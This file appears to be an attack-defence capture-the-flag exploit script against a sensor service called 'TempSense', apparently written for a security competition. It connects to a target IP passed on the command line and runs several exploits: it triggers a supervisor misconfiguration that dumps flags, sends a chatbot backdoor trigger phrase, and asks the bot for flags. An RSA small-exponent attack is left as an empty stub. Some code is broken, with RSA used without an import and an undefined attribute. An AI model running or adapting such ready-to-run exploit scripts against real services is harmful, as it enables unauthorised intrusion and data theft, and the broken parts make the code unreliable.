#!/usr/bin/env python3

import sys
import random
import socket
import time
import base64
import json

ENCODING = 'utf-8'
REGISTRATION = b'1\n'
QUERY = b'2\n'
SUBMISSION = b'3\n'
SUPPORT = b'4\n'

room_map = {
    'Living room': '1',
    'Dining room': '2',
    'Sex dungeon': '3',
    'Flag room': '4',
    'Test room': '5',
    'Bed room': '6',
    'Computer room': '7',
    'Vestibule': '8',
    'Garage': '9',
    'Garden': '10'
}


'''
Attention: this function performs the plain, primitive RSA decryption (textbook).
In real applications, you always need to use proper cryptographic padding, and you should not directly encrypt data with this method.
Failure to do so may lead to security vulnerabilities.
It is recommended to use modules Crypto.Cipher.PKCS1_OAEP or Crypto.Cipher.PKCS1_v1_5 instead.
'''
def decrypt(key, file):
    rsa_key = RSA.importKey(key)
    #print(rsa_key.decrypt(recover_transmission(file, simple=True)).decode(ENCODING).rstrip('\n'))
    return rsa_key.decrypt(recover_transmission(file, simple=True)).decode(ENCODING).rstrip('\n')


def prepare_transmission(string, simple=False):
    if not simple:
        return (base64.standard_b64encode(string.encode()) + reverse(str(base64.standard_b64encode(string.encode())))[1:-2].encode()).decode(ENCODING)
    else:
        return base64.standard_b64encode(string).decode(ENCODING)

def recover_transmission(string, simple=False):
    if not simple:
        return base64.standard_b64decode(string[:(len(string)//2)].encode(ENCODING))
    else:
        return base64.standard_b64decode(string)

def reverse(text):
    if len(text) <= 1:
        return text
    return reverse(text[1:]) + text[0]

class DataEntry(object):
    def __init__(self):
        self.sensor = None
        self.room = None
        self.temp = None
        self.proof = None

    def jinit(self, jsonobject):
        data = json.loads(str(jsonobject, encoding='ascii'))
        self.sensor = data['Sensor']
        self.room = data['Roomname']
        self.temp = data['Temperature']
        self.proof = data['Proof']

    def vinit(self, sensor, room, temp, proof):
        self.sensor = sensor
        self.room = room
        self.temp = temp
        self.proof = proof


    def export(self):
        try:
            return json.dumps({
                'Sensor': self.sensor,
                'Roomname': self.room,
                'Temperature': self.temp,
                'Proof': self.proof
            })
        except Exception as e:
            print(e.args)

    def cli_string(self):
        return ''.join('%s:%s - %s\t%s\n' % (self.room, self.sensor, self.temp, self.proof))

class TempSenseExploiter(object):
    def __init__(self, ip):
        self.sock = None
        self.host = ip
        self.port = 65533

        self.buffer_size = 4096
        self.encoding = 'utf-8'

        self.room_nr = None
        self.room = None

    """
    ##############
       EXPLOITS
    ##############
    """

    """
    The standard Supervisor config loads from the wrong directory (the flag directory) so the supervisor will print out flags instead of speech.
    """
    def ExploitSupervisorMalfunction(self):
        try:
            self.connect()
            #self.recieve()
            self.make_bot_cry()
            self.recieve()
            self.make_bot_cry()
            self.recieve()
            self.make_bot_cry()
            self.recieve()
            data = self.get_flag_dump()
            for line in data.split('\n'):
                if 'FAUST' in line:
                    print("FAUST" + line.split('FAUST')[1])

        except Exception as e:
            print('[-] Supervisor malfunction exploit did not work! Following exception occured: {}'.format(e.args))
        finally:
            self.close()

    """
    There is a backdoor inside the Bot, so that if you were to enter a sentence containing the words [you, only, hope] and some semantic specifics (e.g. not too many nouns and only one verb) the bot will print out ALL flags.
    """
    def ExploitBroBotBackdoor(self):
        try:
            self.connect()
            self.transmit(SUPPORT)
            self.recieve()
            self.transmit('you are our only hope')
            data = self.recieve()
            for line in data.split('\n'):
                if 'FAUST' in line:
                    print(line)

        except Exception as e:
            print('[-] BroBot backdoor exploit did not work! Following exception occured: {}'.format(e.args))
        finally:
            self.close()

    """
    Just ask for a flag. Sometimes you might get one back.
    """
    def ExploitBroBotAskFlag(self):
        try:
            self.connect()
            self.transmit(SUPPORT)
            self.recieve()
            self.transmit('give me flag')
            data = self.recieve()
            for line in data.split('\n'):
                if 'FAUST' in line:
                    print(line)

        except Exception as e:
            print('[-] BroBot backdoor exploit did not work! Following exception occured: {}'.format(e.args))
        finally:
            self.close()

    '''
    The crux of it is this: RSA -> block^e mod n = ciphertext. In our case e=3 and n is a prime from the range 1024 bit. It is likely that with no padding the wrap around due to modulo will not happen. e.g. block = 0002, block^e = 0008, block^e mod n = 0008.
    '''
    def ExploitRSANoPaddingSmallExpo(self):
        # connect
        # query a room
        # get encrypted text for each room entry
        # try to break encryption via RSA Attack
        # ????
        # profit
        pass

    """
    ####################
       HELPER METHODS
    ####################
    """

    ### GENERAL HELPER ###

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))
        self.sock.settimeout(30.0)
        self.recieve()

    def close(self):
        assert isinstance(self.sock, socket.socket)
        # self.sock.shutdown(socket.SHUT_RDWR)
        self.sock.close()
        self.sock = None

    def generate_room_data(self):
        self.room_nr = str(random.randint(1, 10))
        self.room = [room for room in room_map.keys() if room_map[room] == self.room_nr][0]

    def generate_data_entry_object(self):
        data_entry = DataEntry()
        data_entry.vinit(self.mock_id, self.room, str(random.randint(-10, 36)),
                         'FAUST_1_4m_N0T_4_Fl4G')
        return data_entry

    def transmit(self, text):
        text = text
        # print(text)
        if isinstance(text, bytes):
            self.sock.sendall(text)
        else:
            self.sock.sendall(bytes(text, self.encoding))

    def recieve(self):
        data = self.sock.recv(self.buffer_size)
        # print(data)
        return data.decode(self.encoding)

    ### EXPLOIT SUPERVISOR MALFUNCTION HELPER ###

    def make_bot_cry(self):
        self.transmit(SUPPORT)

        data = self.recieve()
        data += self.recieve()
        self.transmit('fuck you\n')
        return self.recieve()

    def get_flag_dump(self):
        self.transmit(SUPPORT)
        data = self.recieve()
        return data



if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Provide IP as sys.argv[1]!")
    else:
        badboy = TempSenseExploiter(sys.argv[1])
        badboy.ExploitSupervisorMalfunction()
        badboy.ExploitBroBotAskFlag()
        badboy.ExploitBroBotBackdoor()
        badboy.ExploitRSANoPaddingSmallExpo()
